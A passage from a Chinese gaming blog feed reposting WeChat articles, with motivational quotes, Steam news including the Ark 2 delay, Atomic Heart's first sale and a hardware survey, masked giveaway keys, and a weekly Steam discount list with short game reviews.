src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0b95c6aa9b76145a0f1ed6efb8e9e89d.png"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2451400ee9145e2f46a37a9818a1ccd2.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-d9d1e9446ee81f40bbb31c952dcffd22.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4b979ea5c6bd0d7f41ec009ec7f1c310.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3ba91e3b42e35f2e43337adf96295c8c.png"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-67c24b5beb6984793db12205daa764ac.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bca829a31a409256a821df97cc365493.png"></p><p>图片为网络收集如有问题，侵删致歉</p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pixiv </tag>
            
            <tag> p站 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 插画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不是愚人节玩笑，《方舟2》跳票，《方舟》停服！《原子之心》首次促销！</title>
      <link href="/7e38a19a.html"/>
      <url>/7e38a19a.html</url>
      
        <content type="html"><![CDATA[<p><strong>01</strong></p><p>《方舟：生存进化》</p><p>《方舟：生存进化》开发商 WildCard 近日宣布，续作《方舟2》再次跳票，延期至2024年底。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f2f9e6de670c14077e65e5455fc5d15d.jpeg"></p><p>同时WildCard 还宣布《方舟：生存进化》将推出次世代版<strong>《方舟：生存升级》</strong>，今年8月上线。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-23218c0328be49f066d49861ad79baab.jpeg"></p><p>《方舟：生存升级》将配有岛屿、大逃杀“最强者生存”和所有非正统DLC地图，并加入全新功能，以及大量优化和增强。还将具有跨平台反作弊、跨平台多人游戏、跨平台帐户和跨平台语音聊天和好友功能。</p><p>2023年8月底，开发商将推出“重生捆绑包”，售价49.99美元，其中包含《方舟：生存升级》与《方舟2》两款游戏，待《方舟2》正式发售时，两款游戏将分别出售。<strong>而《方舟：生存进化》的服务器将于8月关闭…</strong></p><p><strong>02</strong></p><p>《原子之心》</p><p><strong>《原子之心》</strong>现在Steam商店开启了首次折扣促销，标准版8折优惠，折后价191.2元；黄金版白金版则有着7.5折优惠，活动时间截止至4月11日。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4f34ba94796808ef5c7c3b31f4dd8b22.png"></p><p>商店页：s.team&#x2F;a&#x2F;668580&#x2F;</p><p>游戏支持简体中文，当前累计好评率85%，想感受苏联美学乌托邦世界并与烧鸡冰箱亲密互动的同学可以趁此机会下手了。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7d1142409f89798e1fab1c74d5eae8f3.png"></p><p><strong>03</strong></p><p>Steam硬件调查</p><p>近日V社发布了2023年3月Steam硬件调查，PC显卡方面，RTX 3060击败GTX 1650登顶榜首，此前GTX 1650曾连续四个月蝉联显卡榜单第一名，现在下滑至第六名。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7a7acf96ef2a03ae8a6594afe3923f8a.png"></p><p>第二名是RTX 2060，第三名则是GTX 1060。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-dcc5f050d8d47613520c98c904bb3e5b.png"></p><p>操作系统上，Windows 10 64位依然排名第一，并且份额大涨10.97%，为75.65%。Windows 11份额则大幅减少10.35%，为22.92%。</p><p><strong>04</strong></p><p>《先祖：人类奥德赛》</p><p><strong>《先祖：人类奥德赛》</strong>开发商今日宣布游戏销量已实现新的里程碑，突破<strong>150万</strong>份。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-c27dfa529a093314ce85cd423f33e773.png"></p><p>商店页：s.team&#x2F;a&#x2F;536270&#x2F;</p><p>《先祖：人类奥德赛》于2019年8月面向PC平台发行，同年12月登陆主机平台。</p><p>游戏中玩家可以作为史前非洲的灵长类动物的后裔来体验游戏，帮助他们进化并在严酷的荒野中生存下来。游戏售价129元，支持中文，当前累计好评率80%。</p><p><strong>05</strong></p><p>《师父》</p><p>《师父》开发商近日在推特中宣布，在登陆Steam平台（3月28日）4天后，游戏销量达<strong>5万份</strong>，好评率达94%。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-217bc7feff067a1911eaaf7c3f7a6d0c.jpeg"></p><p>在3月份，《师父》开发商就已透露该作全平台销量已突破<strong>200万</strong>份。</p><p><strong>06</strong></p><p>《螃蟹冠军》</p><p>具有Roguelike元素的第三人称螃蟹射击游戏<strong>《螃蟹冠军》</strong>日前在Steam上发售，并在短短两天内收到2000多条评测，好评率高达98%，整体评价“好评如潮”。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3a25879d488357ab9017eeb40ca0b3c5.png"></p><p>商店页：s.team&#x2F;a&#x2F;774801&#x2F;</p><p>在这款游戏中，玩家将成为螃蟹，单人或与最多3名好友一起，穿越岛屿，击败成群结队的敌人并收集战利品，变得更加强大。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-39978df5e5f35cb5c27a69f2c393a73e.gif"></p><p>凭借良好的操作手感与流畅刷快的游玩体验，游戏获得了一众玩家好评，并称之为“雨中冒险2 螃蟹版”。</p><p>游戏售价42元，4月9日前购买可享8.5折首发优惠，暂不支持中文。</p><p><strong>07</strong></p><p>《消逝的光芒2》</p><p>《消逝的光芒2》外观DLC“狂鸡捆绑包”现已上线，售价22元，首发优惠价仅需13.2元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2ec9281834ebaaafbe1c54f3b31767cf.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6fd0127a0b49c8a656d68ee197d9f886.png"></p><p><strong>08</strong></p><p>《我在地球修仙有系统》</p><p>国产修仙刷宝游戏<strong>《我在地球修仙有系统》</strong>上架Steam发售。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b9302f5158a47a484e4d3b1d99e376ae.png"></p><p>商店页：s.team&#x2F;a&#x2F;2057550&#x2F;</p><p>这款游戏讲述的是地球开启无尽灵气时代，主角带着一大群妹子修仙并抵御魔兽入侵地球的故事。游戏拥有超过100关的关卡，数百种装备词条加上多种技能搭配，可以组合出无数种build来，同时兼顾放置挂机和暗黑的刷宝体验，还能够和多位女主进行双修甚至三修….</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a9edd5b15615fb99ef2ac9eb802c39b8.jpeg"></p><p>游戏售价58元，4月11日前首周9折优惠，折后52.2元，当前累计好评率90%。</p><p><strong>09</strong></p><p>《古龙风云录》</p><p>河洛工作室的开放世界武侠RPG新作<strong>《古龙风云录》</strong>正式公布，游戏计划于今年12月正式发售。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f4ed8f2dd61d3d5d0d58551d5b075690.png"></p><p>商店页：s.team&#x2F;a&#x2F;2340650&#x2F;</p><p>据介绍，本游戏奠基于古龙笔下充满冒险、浪漫和英雄主义的江湖世界，结合古龙小说的人物情节，打造一个群侠际会的多情江湖。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b5cfea0e964944e5b6e40f15f6ed9a0c.jpeg"></p><p>玩家将在其中扮演辰雨，你将卷入由残破藏宝图而起的一场足以撼动整个江湖的巨大阴谋中，在体验波澜起伏的主支线剧情之余，还需细心收集交织阴谋的线索，与各路江湖人士交谈以寻找言语中的蛛丝马迹，抽丝剥茧以揭露动乱背后的真相，并找出幕后黑手。</p><p><strong>10</strong></p><p>每日福利</p><p>每天都送喜加一KEY，“点赞”+“在看”的百位数之和，决定第二天中有几个好游戏！</p><p>▲向上滑动</p><p>QBIBM-?D9BM-QI7V4</p><p>GFP3D-FKZRX-6CT58</p><p>ZB38J-?HJBL-JLP3P</p><p>ZTNV9-6V0JN-2FGNE</p><p>QFV53-3Y?HL-NA42Y</p><p>VZNKJ-WKTQY-MDJQ7</p><p>TQGQ6-GZM82-JYINP</p><p>K9X63-GMQIV-G?BK5</p><p>EBVGB-8II49-09XPR</p><p>85QQ8-VL5R?-MWHAB</p><p><strong>激活方式：</strong></p><p>登录Steam，点击左下角“添加游戏”</p><p>点击“在Steam上激活产品”</p><p>（本期包含10个《永歌》</p><p>CDKEY中问号为0~6随机数字）</p><blockquote><p>本篇文章来源于微信公众号: Steam游戏日夜</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> 原子之心 </tag>
            
            <tag> 方舟 </tag>
            
            <tag> 方舟2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam一周特惠游戏推荐：给玩家们一点小小的红色震撼！原子之心首次打折</title>
      <link href="/637a7553.html"/>
      <url>/637a7553.html</url>
      
        <content type="html"><![CDATA[<p><strong><strong><strong><strong>原子之心</strong></strong></strong></strong></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9d36a49d2cb3eff3a6e43213cfe46cc7.png"></p><p>懒人一图流：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ac7dc011f6e63119c7b8d2609a2a8f9c-scaled.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></p><p><strong>原子之心</strong>，开放世界游戏，支持简体中文，8折，售价191（阿区144，土区188），新史低（降幅48，发售后首次打折），性价比还可以，促销截止4.11。</p><p>版本区别：黄金版包含季票；白金版包含季票、皮肤和电子设定集。</p><p>2023.2.21 Mundfish出品，特别好评：83&amp;85%，单人。</p><p>支持手柄，有云存档、集换式卡牌和成就；配置要求：I5-2500、8G内存、GTX960；游戏时长：20-40 小时。</p><p>A-，细致，又粗糙。在《原子之心》中，玩家扮演代号为“P-3”的苏联特种部队队员谢尔盖·内恰耶夫。在接到上级“博士A”派发的任务后，动身前往由博士领导建设、如今已被不受人类控制的机器人所占据的3826区。</p><p>游戏开局设计了一段类似于步行模拟的线性关卡，向玩家们展示了游戏极为独特的艺术风格，和那些充满苏联气息的场景，简约却又十分宏伟壮观的建筑。从游戏开头的十几分钟就不难看出，制作组在场景和建筑的设计上是花了大功夫的。除了各种视觉冲击之外，游戏的配乐同样很赞，能够听取许多名曲的影子。</p><p>作为一款半开放世界游戏，《原子之心》在主线剧情之间设置了不少可供玩家自由探索的内容。游戏的大部分主线都被设计在各种设施里，开放世界中隐藏着不少用于取得触发支线任务特殊道具和武器蓝图的地下设施，但更多的是为跑图的玩家提供沿途可欣赏的风景。</p><p>游戏的战斗系统有点类似于《生化奇兵》。除了前期只能使用近战之外，基本都采用了枪械射击搭配超能力的射击。游戏内的所有武器都需要获取蓝图之后才可以制作，蓝图则需要从指定的箱子里获得，各种配件同样如此。枪械有电击、冰冻和燃烧三种属性，射击手感良好，敌人也都配置了不同的抗性和弱点；手套的各种超能力则通过杀敌获取各种素材来升级。</p><p>除了战斗之外，游戏前中期解谜体验也是挺棒的。除了各种小谜题之外，主线中还设计了特色各异的大型场景解谜，层层递进的谜题设计得确实很赞（还原谋杀案那个谜题确实很有趣）。但后期各种重复出现的开锁解谜还是让人有些蛋疼。</p><p>就如上文所说的，游戏确实和《生化奇兵》很像，在主线剧情间穿插了各种花里胡哨的战斗和解谜。苏式美学的外壳下，却讲述了一个很美式的个人英雄主义故事，似乎和制作组的经历有些关系。</p><p>作为一款毛子出品的游戏，《原子之心》确实有着“细致，又粗糙”这一特点。多但不算致命的BUG、糟糕的操控体验、较为单一的玩法，以及仍有较多提升空间的细节。射爆+超能力看似好玩，实际上在尝试组合出最优解之后就会变得无趣。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-31b8dbc1fede46e532556a58819494ee.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5b68576a39c147058db5c4a576f031f0.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></p><p><strong>暗邪西部</strong>，ACT，支持简体中文，6.5折，售价129（阿区74），新史低（降幅20，距上次新史低2个月），性价比还可以，促销截止4.11。</p><p>2022.11.22Flying Wild Hog出品，多半好评：70&amp;75%，单人&#x2F;在线多人。</p><p>支持手柄，有云存档、集换式卡牌和成就；配置要求：I5-2500K、8G内存、GTX750Ti；游戏时长：20-40小时。</p><p>B+，重复度较高，堆怪严重。《暗邪西部》是一款披着西部射击题材的动作游戏，主角扮演吸（西）血（部）鬼（牛）猎（仔）人。游戏的战斗系统围绕拳套连击和远程武器射击交替构成，颇有几分西部版战神的感觉。</p><p>由于有冷却的限制，各种远程武器的定位偏功能性（伤害也比较有限）。主角更多的是利用左右手的拳套击打敌人，左手上的电击护手拥有全面的辅助功能，右手则能打出拳拳到肉的输入。主角的成长通过技能加点和装备升级来达成，流程偏线性。后期关卡和怪物的重复度都很高，难度又依赖于堆怪，且BUG还不少。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-53e59a571e0a8cd6ab5d4599026c9e9c.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5355e387c6b8593f5bbfee23794f84b0.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></p><p><strong>瘟疫传说：无罪&#x2F;A Plague Tale: Innocence</strong>，剧情冒险游戏，支持简体中文，2折，售价32（阿区14，土区18），平史低（首次史低时间22.6.20，往后大部时间均为2折；基本每个月都打折；进包1次），性价比良好，促销截止4.11。</p><p>版本区别：捆绑了续作。</p><p>2019.5.15 Asobo Studio出品，特别好评：90&amp;93%，单人。</p><p>支持手柄，有云存档、集换式卡牌和成就；配置要求：I3-2120、8G内存、GTX660（2G）；游戏时长：10-20 小时。</p><p>A-，良好的剧情体验。《瘟疫传说：无罪》的背景设定于十四世纪中期的法国，英法战争和黑死病的爆发让整个国家变得动荡和混乱，独特的艺术风格和细节满满的场景设计营造出了极为压抑的游戏氛围。剧情围绕着姐弟二人展开，流程中有着各种细微的情感细节和互动，姐弟间的羁绊也逐渐建立。</p><p>核心玩法则是由战斗、潜行和解谜构成，大部分流程以潜行为主，玩家需要观察骑士的路线和合理的利用地形进行躲避。主角极为强大的投掷能力则是战斗的核心，但战斗存在感较低，boss战更是有点不明所以，总的来说游戏性偏低了一些。解谜则围绕着鼠群展开，玩家需要利用道具和场景互动元素来制造光源，甚至可以利用鼠群作为武器去攻击敌人。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-fb1efa4a16fbff15d90d16d295a8bed3.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ab8957b9edb98b8915469ade0b7fda68.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>文明6&#x2F;Sid Meier’s Civilization VI</strong>，策略战棋游戏，支持简体中文&amp;中配，1折，售价20（阿区2，土区8），平史低（首次史低时间22.11.8，往后均为1折；每个月打折），性价比优秀，促销截止4.18。</p><p>版本区别：豪华版包含季票1和豪华DLC；终极版再加上季票2和黄金武器DLC。</p><p>2016.10.21 Firaxis Games出品，特别好评：89&amp;85%，单人&#x2F;本地&#x2F;在线多人。</p><p>支持创意工坊，有集换式卡牌和成就；配置要求：I5、8G内存、GTX770；游戏时长：100+ 小时（指一把）。</p><p>A-，再来一回合就睡觉。《文明6》是经典策略战棋游戏的最新作。两个大型DLC迭起兴衰和风云变幻极大的丰富了游戏的玩法，加入了许多新系统和文明，如气候变化、世界议会和全新的时代划分机制等，外交系统也得到了大幅的革新。即便是游戏系统完善不少，但相较于5代而言还是略有不足，不过目前MOD也非常丰富了。</p><p>6代的最大特色在于全新的区域规划和工人的消耗品化，采用单城宜居度取代了笑脸系统，大幅的降低了爆铺的惩罚。在与朋友联机的过程中除了AI之外往往还会被他们背刺。推荐本体连同迭起兴衰和风云变幻两个DLC一起入手，新纪元目前折扣也还可以了，新首领季票目前已推出。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8c42fcfffced270077ed148508f2e7f9.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4f50ffeafe73e43eb66f3d48b66ac05a.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>欧洲卡车模拟2&#x2F;Euro Truck Simulator 2</strong>，模拟驾驶游戏，支持简体中文，2.5折，售价27（阿区9，土区13），未达史低21（首次史低时间15.11.25；最近史低时间15.12.22，往后基本均为2.4&#x2F;2.5折；每个月打折；进包6次），性价比良好，促销截止4.11。</p><p>版本区别：包含了两个地图DLC+高运力+内部装饰+车轮定制。</p><p>2012.10.18 SCS Software出品，好评如潮：97&amp;97%，单人&#x2F;在线多人。</p><p>支持手柄、创意工坊，有集换式卡牌和成就；配置要求：较低；游戏时长：100+ 小时。</p><p>A，一杯茶，一包烟，一辆破车开一天。枯燥无趣的卡车司机生活，重复往返运货的乐趣在哪里？穿梭在欧洲各国之间，欣赏沿途风景，听着悠扬的乡村音乐，享受驾驶卡车的乐趣。</p><p>作为一款模拟游戏而言，《欧卡2》也有着极高的拟真度，真实的交通规则带来了更加真实的驾驶体验，仅仅是一个倒车入库就能让玩家倒得死去活来的。逮虾户？飙车达人？法外之徒？秋名山车神？在欧卡2中所有人只能做一个安分守法的卡车司机，你以为修车不要钱的吗？当然游戏偶尔还能用来治疗失眠。</p><p>DLC：DLC均打折中，折扣不同（最新的没有）。个人推荐入手高运力DLC（Heavy Cargo Pack）以及所有的地图DLC（Iberia、Road to the Black Sea、Beyond the Baltic Sea、Italia、Vive la France !、Scandinavia、Going East!、Road to the Black Sea、Iberia），其余随缘补足。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-001ffc35fc745f6a2f01443ad9bf2c9b.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-2c76ffa5790c2b17991a2afa79d4d79e.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>UnderMine</strong>，roguelike，支持简体中文，6.5折，售价46（阿区5，土区7），未达史低25（首次史低时间22.8.1；最近史低时间22.12.23，近期折扣力度不一；每个月都打折），性价比还可以，促销截止4.11。</p><p>2020.8.6 Thorium出品，特别好评：74&amp;92%，单人。</p><p>支持手柄，有云存档、集换式卡牌和成就；配置要求：较低；游戏时长：60-100小时。</p><p>A-，扶我起来，我还能挖。《UnderMine》的核心在于地牢探索和随机性极强的道具组合，与以撒基本一致，甚至如血量、钥匙和炸弹三大核心要素，以及宝箱房、商店和隐藏等设定也非常相似，不过游戏过程中收集到的金矿可以在通关或者死亡之后保留一部分，并可以在城镇中购买各种物品。</p><p>玩家作为一名黄金矿工，核心自然是挖矿，而游戏中的金矿以互动元素的形式设置于场景之中，非常有趣。随机生成的地牢加上多个需要解锁的图鉴，耐玩性还不错。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-df3e6771ad47ba0ee4561808a724d887.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e0c88ba6a902add34b9f7f00b1bf4b85.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>狂野星球之旅</strong>，冒险游戏，支持简体中文，3折，售价27（阿区15，土区18），平史低（首次史低时间22.10.25，往后均为3折；每一个半月打折），性价比良好，促销截止4.11。</p><p>版本区别：包含剧情DLC，故事有点短。</p><p>2021.1.29 Typhoon出品，特别好评：85&amp;88%，单人&#x2F;在线多人。</p><p>支持手柄；配置要求：较低；游戏时长：10-20 小时。</p><p>A-，有趣的游戏体验。《狂野星球之旅》是一款开放世界设定下的以探索为核心的冒险游戏，玩家扮演打工人在外星球探索、收集各种材料和环境资料。鲜艳的色彩搭配丰富的可探索场景构成了美丽的风景线，任务和真人影像等内容设计的很有趣，还藏了不少有趣的彩蛋。探索过程中还有打怪环节，不过整体流程还是偏短了一些。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a90920662979d77c338ecd62e67694bd.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3dcd965dc15f3a59ff3e75d7480e6243.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>地心护核者</strong>（抢先体验），合作生存游戏，支持简体中文，8折，售价34（阿区4，土区6），平史低（首次史低时间22.11.10，往后均为8折；每两个月打折），性价比还可以，促销截止4.11。</p><p>2022.3.8 Pugstorm出品，特别好评：86&amp;91%，单人&#x2F;在线多人。</p><p>支持手柄，有云存档；配置要求：I3-6100、8G内存、GTX950；游戏时长：40-60小时。</p><p>A-，有小伙伴一起玩的话可以一起入手。《地心护核者》是一款以探索挖矿为核心的像素风格多人合作+沙盒生存游戏。游戏融合了类似于泰拉瑞亚的冒险探索挖矿和星露谷物语的种田钓鱼打怪玩法。2~8名玩家在同一个地底世界中探索、搜集资源、挖矿和打怪，从而发展科技、打造装备，在发家致富之前大家都是被虫子追赶的可怜人（当然你也可以自己一个人游玩）。</p><p>角色的技能树和升级加点的设定让每名玩家都能有不同的发展方向。玩家无论在游戏里做什么都可以提升角色的属性，属于是变秃了也变强了的类型。现阶段游戏内容并不完整，地图略显空旷，建筑、装备和物品的种类有待丰富，自动化部分功能不齐全，服务器也不太稳定。好在框架还不错，玩起来意外的魔性。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7b00724ed6d83301cfbf1bd224f490ab.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3a1e9d23788e0e0ccc1a815f9d5338a7.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>疑案追声</strong>，支持简体中文，4.5折，售价17（阿区4，土区5），平史低（首次史低时间21.8.4，往后均为4.5折；每两个月打折），性价比良好，促销截止4.11。</p><p>版本区别：包含黑面观音DLC；捆绑了Virginia、The Guest&#x2F;Orwell。</p><p>2019.3.29 NEXT Studios出品，好评如潮：95&amp;96%，单人。</p><p>有云存档；配置要求：较低；游戏时长：10-20 小时。</p><p>A-，独具创意的设计和玩法。《疑案追声》是一款以声音为核心的悬疑推理游戏，玩家需要通过每个案件现场的平面图、一段现场录音和一些线索来推理出各个人物的信息以及他们与案件的关系，理清整个案件的前因后果。优秀的配音为游戏带来了独特而优秀的体验，空间和声音结合的很棒，各种音效做的也非常赞。比较可惜的整体流程偏短，受到篇幅的限制能够讲述的故事也比较有限。</p><p>DLC：黑面观音分为三幕，内容充足，但故事性方面较为薄弱。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8810c47b24461cc7bd6136ee9353ab1f.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8630a03c19b25cd2017714ddca86a996.jpeg"></p><p><strong><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></strong></p><p><strong>怪物男孩和中咒王国</strong>，平台动作游戏，支持简体中文，3.3折，售价40（阿区10，土区12），平史低（首次史低时间22.1.27，往后均为3.3折；每一个半月打折），性价比良好，促销截止4.15。</p><p>2019.7.25 Game Atelier出品，特别好评：86&amp;90%，单人。</p><p>支持手柄，有云存档、集换式卡牌和成就；配置要求：较低；游戏时长：20-30 小时。</p><p>A-，有趣的平台动作游戏，独特的游戏体验。《怪物男孩和中咒王国》是一款非常有趣的横版平台动作游戏。卡通的画风却打造出了可探索性极强的奇幻世界，多个不同主题的区域，画面细节十足。玩家需要在游戏中四处探索、寻找各种物品。</p><p>游戏的核心玩点在于主角的变身能力，六种形态有着不同的特点和玩法，整个游戏流程需要合理的运用各种变身能力。此外还有魔法、装备和道具系统，当然也少不了解谜、丰富的收集和隐藏元素，不过跳跳乐关卡还是有点折磨人的。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a3cb61f533c74dfbc1549ec8ee8692a1.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9456166d88d727f5cbf2a5543abdde30.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></p><p><strong>Supraland</strong>，冒险解谜游戏，支持简体中文，4折，售价28（阿区2，土区5），未达史低22（首次&#x2F;最近史低时间18.5.19，近期折扣力度不一；每个月打折；进包3次），性价比良好，促销截止4.9。</p><p>版本区别：包含DLC。</p><p>2019.4.5 Supra Games出品，好评如潮：89&amp;96%，单人。</p><p>支持手柄，有云存档、集换式卡牌和成就；配置要求：I5-6600、4G内存、GTX780；游戏时长：20-30小时。</p><p>A-，做任务：×，吃金币：√。《Supraland》是一款独特的艺术风格，奇幻开放世界下的动作冒险游戏，结合了多种玩法，探索、解谜和战斗平衡的恰到好处。游戏以探索为核心，有趣的环境设计，优秀的关卡设计，极为丰富的谜题，搭配多样的能力，多样化的战斗方式，整体自由度较高，交互做得很棒，隐藏要素的设计也恰到好处。</p><p>DLC：全新的故事章节。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f1c95ae8302a4985a1624ef08778ae2d.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-22447388fd1537c7624e68fe98505d52.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ef3a86fc98c6ea9c445638fbe8d557ee.png"></p><p><strong>小兵步枪&#x2F;RUNNING WITH RIFLES</strong>，俯视角射击游戏，支持简体中文，2折，售价12（阿区7，土区11），未达史低11（首次史低时间20.6.19；最近史低时间21.6.24，近期折扣力度不一；每两个月打折；进包1次），性价比优秀，促销截止4.10。</p><p>版本区别：包含2个DLC。</p><p>2015.4.3 Osumia Games出品，特别好评：83&amp;88%，单人&#x2F;多人。</p><p>支持创意工坊、手柄，有云存档、集换式卡牌和成就；支持Mac、Linux；配置要求：较低；游戏时长：30-50 小时。</p><p>A-，玩法有趣。《小兵步枪》是一款非常有趣的俯视角战术射击游戏，游戏有着独特的军官系统，随着军衔的提升，会有各种的跟班，甚至还可以召唤各种空投支援。多个战役搭配各种不同的场景，加上创意工坊的内容，武器和道具的种类同样丰富。</p><p>DLC：全新的战役、地图、载具、武器等。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4998272873759df4629a2bc3bc64c585.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bec099dec1a2efe6983b9fdeeda72e2c.jpeg"></p><blockquote><p>本篇文章来源于微信公众号: 